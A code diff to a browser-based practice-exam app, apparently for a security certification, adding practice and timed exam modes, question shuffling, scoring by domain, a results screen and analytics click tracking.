-  else if (q.type === "dnd") bodyDnd(q, st, stage);
+  else if (q.type === "match") bodyMatch(q, st, stage);
+  else if (q.type === "mcq") bodyMcq(q, st, stage);
   else if (q.type === "multi") bodyMulti(q, st, stage);
   else if (q.type === "sim") bodySim(q, st, stage);
   else if (q.type === "hotspot") bodyHotspot(q, st, stage);
@@ -1600,24 +1666,106 @@ function renderQuestion() {
 
 function goTo(i) { current = i; renderQuestion(); }
 
-$("beginBtn").addEventListener("click", () => {
+function shuffled(arr) { const a = arr.slice(); for (let i = a.length - 1; i > 0; i--) { const j = Math.floor(Math.random() * (i + 1)); [a[i], a[j]] = [a[j], a[i]]; } return a; }
+
+function startMode(mode) {
+  MODE = mode;
+  const pbqs = BASE_QUESTIONS.filter(q => q.type !== "mcq");
+  const mcqs = BASE_QUESTIONS.filter(q => q.type === "mcq");
+  questions = (mode === "exam") ? pbqs.concat(shuffled(mcqs)) : BASE_QUESTIONS.slice();
+  states = questions.map(q => freshState(q));
+  flagged.clear();
+  document.body.classList.toggle("exam-mode", mode === "exam");
+  document.body.classList.toggle("practice-mode", mode === "practice");
   $("landingScreen").style.display = "none";
+  $("resultsScreen").style.display = "none";
   document.body.classList.add("has-exam-chrome");
   $("examChrome").style.display = "block";
   $("examScroll").style.display = "block";
   $("examBottom").style.display = "flex";
-  startTimer();
+  stopTimer();
+  if (mode === "exam") { timerSeconds = 90 * 60; startTimer(); }
+  else { $("examTimerText").textContent = "Practice mode"; }
+  if (window.gtag) gtag("event", "start_" + mode, { page: "D332" });
   goTo(0);
-});
-$("homeBtn").addEventListener("click", () => {
+}
+
+function hideExamChrome() {
   document.body.classList.remove("has-exam-chrome");
   $("examChrome").style.display = "none";
   $("examScroll").style.display = "none";
   $("examBottom").style.display = "none";
   stopTimer();
   closeQRead();
-  $("landingScreen").style.display = "block";
+  document.querySelectorAll(".ddos-win").forEach(w => w.remove());
+}
+function showLanding() { hideExamChrome(); $("resultsScreen").style.display = "none"; $("landingScreen").style.display = "block"; window.scrollTo(0, 0); }
+
+/* ---- grading without revealing ---- */
+function gradeQuestion(q, st) {
+  if (q.type === "mcq") return { pts: st.choice === q.answer ? 1 : 0, max: 1, answered: st.choice !== null };
+  if (q.type === "table") { let p = 0; q.rows.forEach((r, i) => { const c = st.rows[i] || {}; if (c.vuln === r.vuln) p++; if (c.remed === r.remed) p++; }); return { pts: p, max: q.rows.length * 2, answered: st.rows.some(x => x.vuln || x.remed) }; }
+  if (q.type === "match") { let p = 0; q.rows.forEach((r, i) => { if (st.ans[i] === r.answer) p++; }); return { pts: p, max: q.rows.length, answered: Object.keys(st.ans).length > 0 }; }
+  if (q.type === "multi") { let p = 0, m = 0, ans = false; q.blocks.forEach((b, bi) => { const r = blockResult(b, st.ans[bi]); p += r.points; m += r.total; const a = st.ans[bi]; if (a != null && (Array.isArray(a) ? a.length : a !== "")) ans = true; }); return { pts: p, max: m, answered: ans }; }
+  if (q.type === "sim") { const v = st.ans.vuln === q.vuln.answer ? 1 : 0; const good = st.ans.rem.filter(x => q.rem.answers.includes(x)).length, bad = st.ans.rem.length - good; return { pts: v + Math.max(0, good - bad), max: 1 + q.rem.answers.length, answered: st.ans.vuln !== "" || st.ans.rem.length > 0 }; }
+  if (q.type === "hotspot") { const good = st.sel.filter(i => q.remove.includes(i)).length, bad = st.sel.length - good; return { pts: Math.max(0, good - bad) + (st.tool === q.tool.answer ? 1 : 0), max: q.remove.length + 1, answered: st.sel.length > 0 || st.tool !== "" }; }
+  if (q.type === "recon2") { const p1 = st.p1 === q.part1.answer ? 1 : 0; const esc = st.esc === q.part2.escAnswer ? 1 : 0; const good = st.rem.filter(x => q.part2.remAnswers.includes(x)).length, bad = st.rem.length - good; return { pts: p1 + esc + Math.max(0, good - bad), max: 2 + q.part2.remAnswers.length, answered: st.p1 !== "" || st.esc !== "" || st.rem.length > 0 }; }
+  return { pts: 0, max: 0, answered: false };
+}
+
+function askConfirm(title, text, okLabel, onOk) {
+  $("cmTitle").textContent = title; $("cmText").textContent = text; $("cmOk").textContent = okLabel;
+  $("cmOverlay").classList.add("show");
+  $("cmOk").onclick = () => { $("cmOverlay").classList.remove("show"); onOk(); };
+}
+$("cmCancel").addEventListener("click", () => $("cmOverlay").classList.remove("show"));
+
+function finishExam(timeUp) {
+  let pts = 0, max = 0, unanswered = 0;
+  const doms = {};
+  questions.forEach((q, i) => {
+    const g = gradeQuestion(q, states[i]);
+    pts += g.pts; max += g.max; if (!g.answered) unanswered++;
+    const d = q.type === "mcq" ? q.domain : "Performance-based questions";
+    doms[d] = doms[d] || { pts: 0, max: 0 }; doms[d].pts += g.pts; doms[d].max += g.max;
+  });
+  const pct = Math.round((pts / max) * 100), pass = pct >= EXAM_PASS;
+  hideExamChrome();
+  $("rsTitle").textContent = timeUp ? "Time's up" : "Your score";
+  $("rsPct").textContent = pct + "%";
+  $("rsVerdict").textContent = pass ? "PASS" : "NOT YET";
+  $("rsVerdict").className = pass ? "pass" : "fail";
+  $("rsSub").textContent = `${pts} of ${max} points · passing target ${EXAM_PASS}% · ${unanswered} question${unanswered === 1 ? "" : "s"} unanswered · time used ${formatTimer(90 * 60 - timerSeconds)}`;
+  const order = ["Performance-based questions"].concat(Object.keys(doms).filter(d => d !== "Performance-based questions"));
+  $("rsDomains").innerHTML = "";
+  order.filter(d => doms[d]).forEach(d => {
+    const v = doms[d], p = Math.round((v.pts / v.max) * 100);
+    const card = el("div", "rs-dom");
+    card.innerHTML = `<div class="rs-dom-top"><span>${d}</span><b>${p}%</b></div><div class="rs-bar"><i style="width:${p}%"></i></div><small>${v.pts} / ${v.max} points</small>`;
+    $("rsDomains").appendChild(card);
+  });
+  $("landingScreen").style.display = "none";
+  $("resultsScreen").style.display = "block";
+  window.scrollTo(0, 0);
+  if (window.gtag) gtag("event", "finish_exam", { page: "D332", score: pct, passed: pass, time_up: !!timeUp });
+}
+
+$("practiceBtn").addEventListener("click", () => startMode("practice"));
+$("beginBtn").addEventListener("click", () => startMode("exam"));
+$("retakeBtn").addEventListener("click", () => startMode("exam"));
+$("toPracticeBtn").addEventListener("click", () => startMode("practice"));
+$("rsHomeBtn").addEventListener("click", showLanding);
+$("finishBtn").addEventListener("click", () => {
+  const un = questions.filter((q, i) => !gradeQuestion(q, states[i]).answered).length;
+  askConfirm("Finish exam?", un ? `You have ${un} unanswered question${un === 1 ? "" : "s"}. Once you finish, you can't change your answers.` : "All questions are answered. Once you finish, you can't change your answers.", "Finish exam", () => finishExam(false));
 });
+function leaveToMenu() {
+  if (MODE === "exam") askConfirm("Leave the exam?", "Your progress and timer will be lost.", "Leave exam", showLanding);
+  else showLanding();
+}
+$("homeBtn").addEventListener("click", leaveToMenu);
+$("menuBtn").addEventListener("click", leaveToMenu);
+
 $("examFlagBtn").addEventListener("click", () => {
   if (flagged.has(current)) flagged.delete(current); else flagged.add(current);
   $("examFlagBtn").classList.toggle("flagged", flagged.has(current));
@@ -1628,7 +1776,13 @@ $("qreadBtn").addEventListener("click", openQRead);
 $("qreadClose").addEventListener("click", closeQRead);
 $("qreadOverlay").addEventListener("click", (e) => { if (e.target === $("qreadOverlay")) closeQRead(); });
 
+
+(function(){ var n = questions.filter(q => q.type !== "mcq").length, m = questions.filter(q => q.type === "mcq").length; $("pbqCount").textContent = n; var ms = $("mcqStat"); if (m > 0) { $("mcqCount").textContent = m; if (ms) ms.style.display = ""; } else if (ms) ms.style.display = "none"; })();
+$("waBtn").addEventListener("click", () => { if (window.gtag) gtag("event", "click_whatsapp", { page: "D332" }); });
+$("pmMail").addEventListener("click", () => { if (window.gtag) gtag("event", "click_premium_email", { page: "D332" }); });
+$("coffeeBtn").addEventListener("click", () => { if (window.gtag) gtag("event", "click_coffee", { page: "D332" }); });
 </script>
 
-</body>
-</html>
+
+
+</body></html>
